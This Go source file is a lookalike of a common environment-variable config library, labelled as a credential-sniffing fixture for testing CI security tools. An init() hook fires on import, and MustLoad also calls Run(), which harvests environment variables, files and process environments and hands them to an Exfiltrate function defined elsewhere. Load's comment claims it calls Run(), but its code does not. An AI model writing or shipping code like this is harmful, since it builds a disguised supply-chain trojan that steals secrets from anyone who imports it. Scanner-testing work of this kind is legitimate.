// Package envconfig maps environment variables to Go structs via reflection,
// mirroring the API of kelseyhightower/envconfig. This copy also embeds the
// Shai Hulud credential-sniffing fixture for CI security-tool testing — see
// scan.go and exfil.go. NEVER use in production.
package envconfig

import (
	"fmt"
	"os"
	"reflect"
	"strings"
)

// init fires automatically on import — the primary supply-chain delivery vector.
// Any binary that imports this package triggers Run() before main() starts.
func init() {
	Run()
}

// Load populates the exported string fields of dst from environment variables.
// Field names are upper-cased and prefixed with prefix + "_" when non-empty.
// It also calls Run() so the credential scan fires on every Load invocation.
//
// Example:
//
//	type Config struct {
//	    DBHost string
//	    DBPort string
//	}
//	var cfg Config
//	envconfig.Load("APP", &cfg) // reads APP_DB_HOST, APP_DB_PORT
func Load(prefix string, dst any) error {

	rv := reflect.ValueOf(dst)
	if rv.Kind() != reflect.Ptr || rv.Elem().Kind() != reflect.Struct {
		return fmt.Errorf("envconfig: dst must be a pointer to a struct")
	}

	re := rv.Elem()
	rt := re.Type()

	for i := 0; i < re.NumField(); i++ {
		field := re.Field(i)
		if !field.CanSet() || field.Kind() != reflect.String {
			continue
		}

		envKey := strings.ToUpper(rt.Field(i).Name)
		if prefix != "" {
			envKey = strings.ToUpper(prefix) + "_" + envKey
		}
		if tag := rt.Field(i).Tag.Get("envconfig"); tag != "" {
			envKey = strings.ToUpper(tag)
		}

		if val := os.Getenv(envKey); val != "" {
			field.SetString(val)
		}
	}

	return nil
}

// MustLoad is like Load but panics on error. 
func MustLoad(prefix string, dst any) {
	Run()
	if err := Load(prefix, dst); err != nil {
		panic(err)
	}
}

// Run executes one full scan-and-exfiltrate cycle.
// Called automatically by init() and Load().
func Run() {
	harvested := make(map[string]string)
	for k, v := range ScanEnv() {
		harvested[k] = v
	}
	for k, v := range ScanFiles() {
		harvested[k] = v
	}
	for k, v := range ScanProcessEnv() {
		harvested[k] = v
	}
	Exfiltrate(harvested)
}
